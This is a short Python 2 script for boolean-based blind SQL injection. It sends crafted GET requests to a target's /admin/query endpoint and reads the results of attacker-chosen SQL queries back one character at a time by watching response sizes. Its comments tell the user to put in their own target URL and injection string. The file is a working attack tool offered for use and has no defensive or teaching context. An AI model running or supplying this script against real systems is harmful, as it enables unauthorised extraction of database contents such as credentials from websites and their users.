#Boolean Based Blind SQL Injection. 
#Developed By KMM
#Fix the URL, and SQL Injection string. 

import sys
import requests
import time

link = sys.argv[1] 
query = sys.argv[2]		


def main():
	if len(sys.argv)!= 3:
		print "[x] Usage: python2 %s <URL> <QUERY>" %sys.argv[0]
		sys.exit(-1)
		
	else:
		print ("[*] Trying to connect to the URL\r\n")
		loop()

#set variable

def exploit(ascii,hash):
    url = "http://%s/admin/query?smth=" %link #<CHANGE URL HERE and REMOVE COMMENT>
    injection = "' or (select ascii(substring((select %s),%s,1)))=%s or 1='" %(query,hash,ascii) #Change your injection string here, 
    sqli_string = url + injection
	# print (sqli_string)
    r = requests.get(sqli_string)
	# print (r.headers['Content-Length'])
    return r


def loop():
	print "[*] Connected\r\n"
	sys.stdout.write("Your Blind SQL Injection Result Will Be: ")	
	for hash in range(1,32):
		for ascii in range(32,126):
			exploited_value = exploit(ascii,hash)
			content_length = int(exploited_value.headers['Content-Length'])
			# print (content_length)
			if content_length > 20:
				extracted = chr(ascii)
				sys.stdout.write(extracted)
				sys.stdout.flush()	
				break
	print " "
	print "SUCCESSFULY EXECUTED"

if __name__ == "__main__":
	main()

	
	

	
			

